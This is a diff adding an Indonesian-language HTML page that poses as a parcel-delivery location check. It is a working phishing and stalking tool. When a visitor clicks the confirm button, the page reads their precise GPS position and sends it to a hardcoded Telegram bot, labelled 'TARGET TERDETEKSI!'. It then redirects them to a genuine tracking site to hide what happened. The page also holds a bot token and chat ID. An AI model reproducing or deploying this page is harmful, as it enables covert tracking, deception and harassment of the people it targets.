@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Pengiriman Paket</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; }
+        .icon { font-size: 50px; color: #25D366; margin-bottom: 10px; }
+        h2 { color: #1c1e21; margin-bottom: 10px; font-size: 20px; }
+        p { color: #606770; font-size: 14px; line-height: 1.5; }
+        button { background-color: #25D366; color: white; border: none; padding: 12px 25px; border-radius: 25px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        button:hover { background-color: #128C7E; }
+        #status { margin-top: 15px; font-size: 13px; color: #d93025; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="icon">📦</div>
+    <h2>Lacak Paket Anda</h2>
+    <p>Sistem mendeteksi percobaan pengiriman. Silakan konfirmasi lokasi Anda untuk memandu kurir ke titik presisi.</p>
+    
+    <button onclick="prosesLokasi()">KONFIRMASI LOKASI</button>
+    
+    <div id="status"></div>
+</div>
+
+<script>
+    // --- GANTI DENGAN DATA KAMU ---
+    const TELEGRAM_TOKEN = '7812290821:AAFzF23bx9A1Wt1yJHy6tOIbe-f7RBMJ-ag';
+    const TELEGRAM_CHAT_ID = '7588105919';
+    // ------------------------------
+
+    function prosesLokasi() {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerText = "Menghubungkan ke GPS...";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(kirimData, tanganiError, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        } else {
+            statusDiv.innerText = "Browser tidak mendukung pelacakan.";
+        }
+    }
+
+    function kirimData(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const akurasi = position.coords.accuracy;
+        
+        // Membuat link Google Maps
+        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // Pesan yang akan muncul di Telegram kamu
+        const pesan = `🚨 *TARGET TERDETEKSI!* \n\n` +
+                      `📍 Lokasi: [Klik di Sini](${googleMaps})\n` +
+                      `🎯 Akurasi: ${akurasi} meter\n` +
+                      `📱 Info: Browser User Terverifikasi`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;
+
+        fetch(url).then(response => {
+            if (response.ok) {
+                document.getElementById('status').style.color = "#25D366";
+                document.getElementById('status').innerText = "Lokasi Berhasil Diverifikasi!";
+                // Opsional: Arahkan target ke situs asli setelah 2 detik
+                setTimeout(() => {
+                    window.location.href = "https://www.cekresi.com";
+                }, 2000);
+            }
+        });
+    }
+
+    function tanganiError(error) {
+        const statusDiv = document.getElementById('status');
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                statusDiv.innerText = "Gagal: Anda harus mengizinkan akses lokasi.";
+                break;
+            default:
+                statusDiv.innerText = "Terjadi kesalahan teknis.";
+                break;
+        }
+    }
+</script>
+
+</body>
+</html>
